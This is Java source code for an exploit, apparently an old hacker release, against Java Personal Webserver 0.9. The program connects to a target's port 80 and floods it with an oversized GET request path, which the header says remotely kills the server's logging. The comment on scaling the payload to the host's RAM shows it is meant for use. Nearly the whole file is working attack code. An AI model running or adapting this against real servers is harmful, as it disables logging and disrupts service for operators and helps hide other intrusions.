/* lukewarm.java by wyze1

   This remotely kills the logging on Java Personal Webserver 0.9
   An exploit for a Java webserver written in Java. HEH. Imagine that.

   Greetz to: My cat. He is secretly also Neato Elito. Werd.               */

import java.io.*;
import java.net.*;

  public class lukewarm {
    public static void main(String[] args) throws IOException {

      Socket evilSocket = null;
      PrintWriter out = null;

      if (args.length != 1) {
        System.out.println("Syntax: java lukewarm [hostname]");
        System.exit(0);
      }

      System.out.print("lukewarm.java by wyze1\n\n");

      try {
        evilSocket = new Socket(args[0], 80);
        out = new PrintWriter(evilSocket.getOutputStream(), true);
      } catch (UnknownHostException e) {
          System.out.println("Hostname lookup for " + args[0] + " failed.");
          System.exit(1);
      } catch (IOException e) {
          System.out.println("I/O Error");
          System.exit(1);
      }

      System.out.println("Connected to " + args[0]);
      out.print("GET /-");
      System.out.print("Sending String... ");

      // Host has more than 64MB of RAM? Jack up 300 to whatever you need.

      for (int i = 0; i < 300; i++) {
        out.print("i-LoVe-dRinKinG-BeeR-");
      } 

      out.print("OKAY? BITCH!\n\n");
      System.out.println("Sent!");

      out.close();
      evilSocket.close();
      }
}
